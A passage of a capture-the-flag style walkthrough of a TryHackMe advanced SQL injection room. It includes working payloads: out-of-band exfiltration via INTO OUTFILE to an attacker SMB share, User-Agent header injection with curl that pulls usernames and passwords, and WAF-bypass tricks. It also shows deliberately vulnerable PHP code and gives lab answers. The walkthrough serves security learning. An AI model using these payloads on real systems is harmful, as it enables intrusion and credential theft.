+the AttackBox (your attacking machine) will create a shared folder called `logs` on its network. This share is accessible over the network and allows files from other machines to be written to it.  You may assume a scenario when you get a vulnerable system and want to pivot data to another network share system. The attacker will leverage this share to exfiltrate data Out-of-band. To have a network share, we would start the AttackBox and execute the following command in the terminal:
+
+Navigate to `impacket` directory using `cd /usr/share/doc/python3-impacket/examples/` as I am using Kali Linux.
+
+Enter the command `python3 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp` to start the SMB server sharing the `/tmp` directory.
+
+<img width="427" height="114" alt="image" src="https://github.com/user-attachments/assets/8fe2d318-7093-4e1c-ace3-593b30a9128b" />
+
+You can access the contents of the network share by entering the command `smbclient //ATTACKBOX_IP/logs -U guest -N`. This would allow you to connect to the network share, and then you can issue the command `ls` to list all the commands.
+
+**Note**: Use the tun0 IP as ATTACKBOX_IP.
+
+<img width="641" height="218" alt="image" src="https://github.com/user-attachments/assets/601e40e6-92e8-4c3e-8b3a-0b9cc87c9b6f" />
+
+We have the same web application with a search feature that queries visitors who visit the library. The server-side code for this feature is vulnerable to SQL injection, and you can access it at `http://10.49.138.25/oob/search_visitor.php?visitor_name=Tim`
+
+<img width="449" height="113" alt="image" src="https://github.com/user-attachments/assets/a659902d-0b48-44bb-83e3-ccade994cf4d" />
+
+The server code looks like this:
+
+```
+$visitor_name = $_GET['visitor_name'] ?? '';
+
+$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
+
+echo "<p>Generated SQL Query: $sql</p>";
+
+// Execute multi-query
+if ($conn->multi_query($sql)) {
+    do {
+        // Store first result set
+        if ($result = $conn->store_result()) {
+            if ($result->num_rows > 0) {
+                while ($row = $result->fetch_assoc()) {
+```
+
+**Important Consideration**
+
+It is important to note that the MySQL system variable `secure_file_priv` may be set. When set, this variable contains a directory pathname, and MySQL will only allow files to be written to this specified directory. This security measure helps mitigate the risk of unauthorised file operations. 
+- When `secure_file_priv` is Set: MySQL will restrict file operations such as `INTO OUTFILE` to the specified directory. This means attackers can only write files to this directory, limiting their ability to exfiltrate data to arbitrary locations.
+- When `secure_file_priv` is Empty: If the `secure_file_priv` variable is empty, MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This configuration poses a higher risk as it provides more flexibility for attackers.
+
+Attackers typically do not have direct access to check the value of the `secure_file_priv` variable. As a result, they must rely on hit-and-trial methods to determine if and where they can write files, testing various paths to see if file operations succeed.
+
+**Preparing the Payload**
+
+To exploit this vulnerability, the attacker crafts a payload to inject into the `visitor_name` parameter. The payload will be designed to execute an additional SQL query that writes the database version information to an external SMB share.
+
+```
+1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
+```
+
+Let's dissect the above payload:
+- `1'`: Closes the original string within the SQL query.
+- `;`: Ends the first SQL statement.
+- `SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';`: Executes a new SQL statement that retrieves the database version and writes it to an SMB share at `\\ATTACKBOX_IP\logs\out.txt`.
+- `--`: Comments the rest of the original SQL query to prevent syntax errors.
+
+To utilise the payload, the attacker would visit the URL that creates a file in an external SMB share. 
+
+<img width="674" height="75" alt="image" src="https://github.com/user-attachments/assets/3e77bee8-dcf5-4e09-bce0-24d62f60c1f8" />
+
+To access the file, use the `ls /tmp` to see the file received in the `/tmp` directory as shown below: 
+
+<img width="194" height="37" alt="image" src="https://github.com/user-attachments/assets/fc2c1c0b-993e-498d-a04f-69b731d9c1af" />
+
+---
+
+### Answer the questions below
+
+1. What is the output of the @@version on the MySQL server?
+
+10.4.24-MariaDB
+
+<img width="116" height="29" alt="image" src="https://github.com/user-attachments/assets/7097bdeb-7158-4dcf-8df6-1d6c07ed4526" />
+
+2. What is the value of @@basedir variable?
+
+`C:/xampp/mysql`
+
+Execute the SQL Query: `http://10.49.138.25/oob/search_visitor.php?visitor_name=1'; SELECT @@basedir INTO OUTFILE '\\\\YOUR_TUN0_IP\\logs\\basedir.txt'; -- -`
+
+<img width="696" height="83" alt="image" src="https://github.com/user-attachments/assets/b3f083e5-d2c4-470d-87bc-32d53ff70c1b" />
+
+Then see the contents by `cat /tmp/basedir.txt`
+
+<img width="140" height="29" alt="image" src="https://github.com/user-attachments/assets/fab3708e-4bc6-4e2f-b92f-f2477c691591" />
+
+**Note**: Start the python SMB Server again, if you donot see the `basedir.txt`
+
+## Other Techniques
+
+Advanced SQL injection involves a range of sophisticated methods that go beyond basic attacks. Here are a few important advanced techniques that pentesters should be aware of:
+
+### HTTP Header Injection
+
+HTTP headers can carry user input, which might be used in SQL queries on the server side. user-agent injectionIf these inputs are not sanitised, it can lead to SQL injection. The technique involves manipulating HTTP headers (like `User-Agent`, `Referer`, or `X-Forwarded-For`) to inject SQL commands. The server might log these headers or use them in SQL queries. 
+
+For example, a malicious `User-Agent` header would look like `User-Agent: ' OR 1=1; --`. If the server includes the User-Agent header in an SQL query without sanitising it, it can result in SQL injection.
+
+In this example, a web application logs the User-Agent header from HTTP requests into a table named logs in the database. The application provides an endpoint at `http://10.49.130.247/httpagent/` that displays all the logged entries from the logs table. When users visit a webpage, their browser sends a User-Agent header, which identifies the browser and operating system. This header is typically used for logging purposes or to tailor content for specific browsers. In our application, this User-Agent header is inserted into the logs table and can then be viewed through the provided endpoint.
+
+<img width="518" height="154" alt="image" src="https://github.com/user-attachments/assets/4013bbc2-ae0f-4ac2-bdf0-9f129d0c8eb7" />
+
+Given the endpoint, an attacker might attempt to inject SQL code into the User-Agent header to exploit SQL injection vulnerabilities. For instance, by setting the User-Agent header to a malicious value such as User-Agent: `' UNION SELECT username, password FROM user; --`, an attacker attempts to inject SQL code that combines the results from the logs table with sensitive data from the user table.
+
+Here is the server-side code that inserts the logs.
+
+```
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
+if ($conn->query($insert_sql) === TRUE) {
+    echo "<p class='text-green-500'>New logs inserted successfully</p>";
+} else {
+    echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
+}
+
+$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
+```
+
+The User-Agent value is inserted into the logs table using an `INSERT` SQL statement. If the insertion is successful, a success message is displayed. An error message with details is shown if there is an error during insertion.
+
+**Preparing the Payload**
+
+We will prepare and inject an SQL payload into the `User-Agent` header to demonstrate how SQL injection can be exploited through HTTP headers. Our target payload will be `' UNION SELECT username, password FROM user; #`. This payload is designed to:
+- Close the Existing String Literal: The initial single quote (`'`) is used to close the existing string literal in the SQL query.
+- Inject a UNION SELECT Statement: The `UNION SELECT username, password FROM user;` part of the payload is used to retrieve the username and password columns from the user table.
+- Comment Out the Rest of the Query: The `#` character is used to comment out the remainder of the SQL query, ensuring that any subsequent SQL code is ignored.
+
+We need to send this payload as part of the User-Agent header in our HTTP request to inject this payload, which could be done using tools like Burp Suite or cURL. We will use the `curl` command-line tool to send an HTTP request with a custom `User-Agent` header. 
+
+Command: `curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://MACHINE_IP/httpagent/`
+
+<img width="854" height="225" alt="image" src="https://github.com/user-attachments/assets/05c97b0e-96ce-43e7-ae47-b6a27cac52cf" />
+
+The server's response will be displayed in the terminal. If the SQL injection is successful, you will see the extracted data (usernames and passwords) in the response.
+
+---
+
+### Exploiting Stored Procedures
+
+Stored procedures are routines stored in the database that can perform various operations, such as inserting, updating, or querying data. While stored procedures can help improve performance and ensure consistency, they can also be vulnerable to SQL injection if not properly handled.
+
+A stored procedure is a pre-written set of SQL commands saved inside the database. You can call it whenever you need it instead of writing the same SQL commands again.
+
+Stored procedures are precompiled SQL statements that can be executed as a single unit. They are stored in the database and can be called by applications to perform specific tasks. Stored procedures can accept parameters, which can make them flexible and powerful. However, if these parameters are not properly sanitised, they can introduce SQL injection vulnerabilities.
+
+Consider a stored procedure designed to retrieve user data based on a username:
+
+```
+CREATE PROCEDURE sp_getUserData
+    @username NVARCHAR(50)
+AS
+BEGIN
+    DECLARE @sql NVARCHAR(4000)
+    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
+    EXEC(@sql)
+END
+```
+
+In this example, the stored procedure concatenates the `@username` parameter into a dynamic SQL query. This approach is vulnerable to SQL injection because the input is not sanitised.
+
+---
+
+### XML and JSON Injection 
+
+Applications that parse XML or JSON data and use the parsed data in SQL queries can be vulnerable to injection if they do not properly sanitise the inputs. XML and JSON injection involves injecting malicious data into XML or JSON structures that are then used in SQL queries. This can occur if the application directly uses parsed values in SQL statements.
+
+```
+{
+  "username": "admin' OR '1'='1--",
+  "password": "password"
+}
+```
+
+If the application uses these values directly in a SQL query like `SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'`, it could result in an injection.
+
+---
+
+### Answer th questions below
+
+1. What is the value of the flag field in the books table where book_id =1?
+
+We dont know the columns of the books table so first finding out the columns: `curl -H "User-Agent: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='books' # " http://MACHINE_IP/httpagent/`
+
+<img width="856" height="260" alt="image" src="https://github.com/user-attachments/assets/d66957c0-1200-4087-a657-69414cf702a8" />
+
+This gives us 5 columns: `book_id`, `ssn`, `book_name`, `author` and `flag`
+
+Now we know the columns then getting the flag: `curl -H "User-Agent: ' UNION SELECT book_id, flag  FROM books WHERE book_id = 1; # " http://MACHINE_IP/httpagent/`
+
+<img width="1723" height="430" alt="image" src="https://github.com/user-attachments/assets/d13d549f-4656-4eb3-86c4-dcd952e8b2f4" />
+
+2. What field is detected on the server side when extracting the user agent from an HTTP request?
+
+User-Agent
+
+## Automation
+
+SQL Injection remains a common threat due to improper implementation of security measures and the complexity of different web frameworks. Automating identification and exploiting these vulnerabilities can be challenging, but several tools and techniques have been developed to help streamline this process.
+
+---
+
+### Major Issues During Identification
+
+Identifying SQL Injection vulnerabilities involves several challenges, similar to identifying any other server-side vulnerability. Here are the key issues:
+- **Dynamic Nature of SQL Queries**: SQL queries can be dynamically constructed, making it difficult to detect injection points. Complex queries with multiple layers of logic can obscure potential vulnerabilities.
+- **Variety of Injection Points**: SQL Injection can occur in different parts of an application, including input fields, HTTP headers, and URL parameters. Identifying all potential injection points requires thorough testing and a comprehensive understanding of the application.
+- **Use of Security Measures**: Applications may use prepared statements, parameterized queries, and ORM frameworks, which can prevent SQL Injection. Automated tools must be able to differentiate between safe and unsafe query constructions.
+- **Context-Specific Detection**: The context in which user inputs are used in SQL queries can vary widely. Tools must adapt to different contexts to accurately identify vulnerabilities.
+
+An Object-Relational Mapping (ORM) framework is a programming tool that connects object-oriented code to relational databases, letting developers manage data using objects instead of writing raw SQL queries.
+
+---
+
+### Few Important Tools
+
+Several renowned tools and projects have been developed within the security community to aid in the automation of finding SQL Injection vulnerabilities. Here are a few well-known tools and GitHub repositories that provide functionalities for detecting and exploiting SQL Injection:
+- [SQLMap](https://github.com/sqlmapproject/sqlmap): SQLMap is an open-source tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the tool in this room [SQLMAP](https://tryhackme.com/room/sqlmap).
+- [SQLNinja](https://github.com/xxgrunge/sqlninja): SQLNinja is a tool specifically designed to exploit SQL Injection vulnerabilities in web applications that use Microsoft SQL Server as the backend database. It automates various stages of exploitation, including database fingerprinting and data extraction.
+- [JSQL Injection](https://github.com/ron190/jsql-injection): A Java library focused on detecting SQL injection vulnerabilities within Java applications. It supports various types of SQL Injection attacks and provides a range of options for extracting data and taking control of the database.
+- [BBQSQL](https://github.com/CiscoCXSecurity/bbqsql): BBQSQL is a Blind SQL Injection exploitation framework designed to be simple and highly effective for automated exploitation of Blind SQL Injection vulnerabilities. 
+
+Database fingerprinting is the process of identifying a database management system (DBMS) type and version, or creating a unique data identifier to prevent and track the unauthorized leakage or redistribution of sensitive data.
+
+Blind SQL injection (Blind SQLi) happens when a web app is vulnerable to SQL injection, but it does not show database data or error messages on the screen.
+
+---
+
+### Answer the questions below
+
+Does the dynamic nature of SQL queries assist a pentester in identifying SQL injection (yea/nay)?
+
+nay
+
+## Best Practices
+
+SQL injection is a renowned and pervasive vulnerability that has been a major concern in web application security for years. Pentesters must pay special attention to this vulnerability during their assessments, as it requires a thorough understanding of various techniques to identify and exploit SQL injection points. Similarly, secure coders must prioritise safeguarding their applications by implementing robust input validation and adhering to secure coding practices to prevent such attacks. A few of the best practices are mentioned below: 
+
+---
+
+### Secure Coders
+
+**Parameterised Queries and Prepared Statements**: Use parameterised queries and prepared statements to ensure all user inputs are treated as data rather than executable code. This technique helps prevent SQL injection by separating the query structure from the data. 
+
+For example, in PHP with PDO, you can prepare a statement and bind parameters, which ensures that user inputs are safely handled like `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $username]);`.
+
+PHP Data Objects (PDO) is a lightweight, consistent data-access abstraction layer built into PHP that allows developers to interact with multiple database systems using the same code structure.
+
+**Input Validation and Sanitisation**: Implement strong input validation and sanitization to ensure that inputs conform to expected formats. Validate data types, lengths, and ranges, and reject any input that does not meet these criteria. Use built-in functions such as `htmlspecialchars()` and `filter_var()` in PHP to sanitise inputs effectively.
+
+**Least Privilege Principle**: Apply the principle of least privilege by granting application accounts the minimum necessary database permissions. Avoid using database accounts with administrative privileges for everyday operations. This minimises the potential impact of a successful SQL injection attack by limiting the attacker's access to critical database functions.
+
+**Stored Procedures**: Encapsulate and validate SQL logic using stored procedures. This allows you to control and validate the inputs within the database itself, reducing the risk of SQL injection. Ensure that stored procedures accept only validated inputs and are designed to handle input sanitization internally.
+
+**Regular Security Audits and Code Reviews**: Conduct regular security audits and code reviews to identify and address vulnerabilities. Automated tools can help scan for SQL injection risks, but manual reviews are also essential to catch subtle issues. Regular audits ensure that your security practices stay up-to-date with evolving threats.
+
+---
+
+### Pentesters
+
+**Exploiting Database-Specific Features**: Different database management systems (DBMS) have unique features and syntax. A pentester should understand the specifics of the target DBMS (e.g., MySQL, PostgreSQL, Oracle, MSSQL) to exploit these features effectively. For instance, MSSQL supports the `xp_cmdshell` command, which can be used to execute system commands.
+
+**Leveraging Error Messages**: Exploit verbose error messages to gain insights into the database schema and structure. Error-based SQL injection involves provoking the application to generate error messages that reveal useful information. 
+
+For example, using `1' AND 1=CONVERT(int, (SELECT @@version)) --` can generate errors that leak version information.
+
+**Bypassing WAF and Filters**: Test various obfuscation techniques to bypass Web Application Firewalls (WAF) and input filters. This includes using mixed case (`SeLeCt`), concatenation (`CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))`), and alternate encodings (hex, URL encoding). Additionally, using inline comments (`/**/`) and different character encodings (e.g., `%09`, `%0A`) can help bypass simple filters.
+
+**Database Fingerprinting**: Determine the type and version of the database to tailor the attack. This can be done by sending specific queries that yield different results depending on the DBMS. For instance, `SELECT version()` works on PostgreSQL, while `SELECT @@version` works on MySQL and MSSQL.
+
+**Pivoting with SQL Injection**: Use SQL injection to pivot and exploit other parts of the network. Once a database server is compromised, it can be used to gain access to other internal systems. This might involve extracting credentials or exploiting trust relationships between systems.
+
+---
+
+### Answer the questions below
+
+What command does MSSQL support to execute system commands?
+
+`xp_cmdshell`
